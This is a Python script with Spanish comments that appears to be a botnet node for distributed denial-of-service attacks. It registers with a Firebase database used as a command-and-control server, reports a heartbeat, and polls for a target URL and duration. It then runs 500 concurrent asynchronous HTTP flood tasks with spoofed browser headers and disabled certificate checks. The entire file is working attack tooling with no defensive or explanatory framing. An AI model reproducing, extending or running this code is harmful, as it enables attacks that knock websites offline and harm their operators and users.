import asyncio
import aiohttp
import time
import random
import json
import ssl

DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"
NODE_ID = f"Ryxen-Alpha-{random.randint(100, 999)}"

async def report_status():
    """Mantiene la máquina visible en el C2"""
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                await session.put(f"{NODES_URL}/{NODE_ID}.json", json={"id": NODE_ID, "t": time.time()})
            except: pass
            await asyncio.sleep(10)

async def flood(target, end_time):
    """Motor asíncrono de alto rendimiento"""
    # Creamos un contexto SSL que ignora verificaciones para evitar el error SSL
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    connector = aiohttp.TCPConnector(limit=0, ssl=ssl_context, ttl_dns_cache=300)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Upgrade-Insecure-Requests": "1"
    }

    async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
        while time.time() < end_time:
            try:
                # HTTP Flood + TLS Handshake masivo
                async with session.get(target, timeout=5) as response:
                    await response.release() # Soltamos la conexión rápido para la siguiente
            except:
                continue

async def main():
    print(f"[SYSTEM] {NODE_ID} Operativo. Modo Asíncrono Activado.")
    asyncio.create_task(report_status())
    
    last_stamp = ""
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(DB_URL) as r:
                    data = await r.json()
                
                if data and data.get('stamp') != last_stamp:
                    last_stamp = data['stamp']
                    target = data['target'] if data['target'].startswith("http") else f"http://{data['target']}"
                    duration = int(data['time'])
                    end_time = time.time() + duration
                    
                    print(f"[!] INICIANDO TORMENTA: {target} | {duration}s")
                    # Creamos 500 tareas asíncronas (equivalente a miles de hilos)
                    tasks = [flood(target, end_time) for _ in range(500)]
                    await asyncio.gather(*tasks)
            except: pass
            await asyncio.sleep(2)

if __name__ == "__main__":
    asyncio.run(main())

